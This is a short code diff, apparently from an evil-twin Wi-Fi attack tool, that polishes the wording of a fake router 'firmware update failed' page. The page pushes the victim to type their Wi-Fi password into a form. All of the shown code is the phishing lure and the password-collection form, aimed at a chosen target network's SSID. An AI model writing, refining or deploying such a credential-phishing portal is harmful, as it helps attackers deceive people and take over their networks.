@@ -39,9 +39,9 @@ String _correct = "";
 String _tryPassword = "";
 
 // Default main strings
-#define SUBTITLE "WIFI ROUTER RESCUE MODE"
-#define TITLE "&#9888;Firmware Update Failed"
-#define BODY "<h3>Your Router encountered a problem while automatically installing the latest firmware update.</h3><br><h4>In order to Restore Router old Firmware,<br> Please Verify Your Password.</h4>"
+#define SUBTITLE "WI-FI ROUTER RESCUE MODE"
+#define TITLE "&#9888;Firmware update failed"
+#define BODY "<h3>Your router encountered a problem while automatically installing the latest firmware update.</h3><br><h4>In order to restore router old firmware,<br>please verify your password.</h4>"
 
 String header(String t) {
   String a = String(_selectedNetwork.ssid);
@@ -70,7 +70,7 @@ String footer() {
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>Wi-Fi password:</label>" +
          "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
 }
 
